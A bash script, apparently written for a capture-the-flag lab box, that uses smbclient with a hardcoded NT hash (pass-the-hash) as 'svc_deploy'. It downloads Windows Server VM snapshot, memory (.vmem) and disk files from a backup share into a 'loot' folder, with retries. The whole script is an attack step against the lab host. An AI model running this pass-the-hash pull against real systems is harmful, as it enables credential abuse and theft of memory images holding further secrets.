#!/bin/bash

USER='checkpoint.htb/svc_deploy'
PASS='e16081eb077aca74bdbf8af12af43ac9'
HOST='10.129.5.154'
SHARE='VMBackups'
REMOTE_PATH='NightlyBackup_2024-11-01/memory forensics'
LOCAL_DIR='loot/vmbackup'

mkdir -p "$LOCAL_DIR"

FILES=(
"Windows Server 2019-Snapshot1.vmem"
"Windows Server 2019-Snapshot1.vmsn"
"Windows Server 2019.vmx"
"Windows Server 2019.vmdk"
"Windows Server 2019-000001.vmdk"
"Windows Server 2019.nvram"
"Windows Server 2019.vmsd"
"Windows Server 2019.scoreboard"
)

download_file () {
    FILE=$1

    echo "[+] Downloading $FILE"

    for i in {1..5}; do
        smbclient //$HOST/$SHARE -U "$USER%$PASS" --pw-nt-hash -m SMB2 -c "
        lcd $LOCAL_DIR;
        cd \"$REMOTE_PATH\";
        get \"$FILE\";
        " && break

        echo "[-] Retry $i failed for $FILE"
        sleep 3
    done
}

for f in "${FILES[@]}"; do
    download_file "$f"
done

echo "[+] Done"
